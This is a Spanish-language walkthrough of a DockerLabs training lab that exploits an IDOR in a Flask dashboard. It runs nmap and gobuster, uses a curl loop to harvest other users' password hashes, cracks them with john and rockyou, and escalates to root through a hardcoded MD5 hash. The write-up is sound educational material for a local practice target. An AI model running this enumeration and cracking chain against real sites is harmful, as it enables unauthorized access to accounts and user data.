---
title: "DockerLabs - Aidor"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar la vulnerabilidad IDOR y conseguir automatizar la extracción de información de distintos usuarios registrados en la web.

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos abiertos:
- **22/tcp** — SSH (OpenSSH)
- **5000/tcp** — HTTP (Werkzeug / Python 3.13) — página de login

## Enumeración Web

La aplicación es una app Flask con página de login en `http://172.17.0.2:5000/`.

Se registró un usuario y se accedió al dashboard, que expone el ID de usuario directamente en la URL:

```
http://172.17.0.2:5000/dashboard?id=55
```

El dashboard muestra: nombre de usuario, email, ID y el **hash SHA-256 de la contraseña**.

Enumeración de endpoints:

```bash
gobuster dir -u http://172.17.0.2:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -b 302,404
```

Endpoints encontrados: `/register`, `/change_password`, `/console`

## Explotación — IDOR

El parámetro `?id=` de la URL corresponde al `user_id` de la sesión Flask. Cambiando el ID se accede al dashboard de otros usuarios sin validación:

```bash
for i in $(seq 1 100); do
  resp=$(curl -s -b "session=<cookie>" "http://172.17.0.2:5000/dashboard?id=$i")
  echo "=== ID $i ===" && echo "$resp" | grep -i "hash\|user\|email"
done
```

### Cracking del hash SHA-256

```bash
echo "04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb" > hash.txt
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-sha256 hash.txt
# chocolate
```

```bash
ssh aidor@172.17.0.2
# contraseña: chocolate
```

## Escalada de Privilegios

En el código fuente de la app Flask (`app.py`) se encuentra un hash MD5 comentado:

```python
# ('root', 'aa87ddc5b4c24406d26ddad771ef44b0', 'admin@example.com')
```

```bash
echo "aa87ddc5b4c24406d26ddad771ef44b0" > root.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt root.txt
# estrella
```

```bash
su root
# contraseña: estrella
whoami
# root
```

## Conclusión

Cadena de ataque: IDOR en el dashboard → extracción de hashes SHA-256 de otros usuarios → crackeo con john → SSH como `aidor` → hash MD5 hardcodeado en `app.py` → root.
